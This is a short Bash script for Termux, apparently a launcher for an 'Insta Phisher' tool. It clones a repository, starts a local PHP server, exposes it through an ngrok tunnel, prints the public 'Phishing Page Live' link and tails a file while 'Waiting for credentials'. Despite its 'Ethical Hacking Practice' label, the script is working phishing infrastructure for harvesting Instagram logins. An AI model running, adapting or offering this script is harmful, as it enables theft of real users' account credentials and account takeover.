#!/bin/bash

# Colors
RED='\033[1;31m'
GRN='\033[1;32m'
NC='\033[0m' # No Color

clear

# Banner
if ! command -v figlet >/dev/null 2>&1; then
    pkg install figlet -y
fi
if ! command -v lolcat >/dev/null 2>&1; then
    pkg install ruby -y
    gem install lolcat
fi

figlet "Insta Phisher" | lolcat
echo -e "${GRN}Instagram Phishing Tool for Ethical Hacking Practice${NC}"
echo -e "Created by: Jaat-Hacker\n"

# Clone repo
echo -e "${GRN}[*] Cloning repository...${NC}"
git clone https://github.com/YOUR_USERNAME/instagram-phishing-tool.git
cd instagram-phishing-tool || { echo -e "${RED}Failed to enter folder!${NC}"; exit 1; }

# Install dependencies
echo -e "${GRN}[*] Installing requirements...${NC}"
pkg install php wget unzip -y > /dev/null 2>&1

# Setup Ngrok
if [ ! -f "ngrok" ]; then
    echo -e "${GRN}[*] Downloading ngrok...${NC}"
    wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-arm.zip
    unzip ngrok-stable-linux-arm.zip
    chmod +x ngrok
fi

# Start PHP server
echo -e "${GRN}[*] Starting PHP server...${NC}"
php -S 127.0.0.1:8080 > /dev/null 2>&1 &
sleep 2

# Start Ngrok
echo -e "${GRN}[*] Starting Ngrok...${NC}"
./ngrok http 8080 > /dev/null 2>&1 &
sleep 5

# Show Public URL
echo -e "${GRN}[+] Phishing Page Live at:${NC}"
curl -s http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io" | tee link.txt

# Monitor logins
echo -e "\n${GRN}[!] Waiting for credentials...${NC}"
echo -e "${RED}Press CTRL+C to stop.${NC}"
touch login.txt
tail -f login.txt
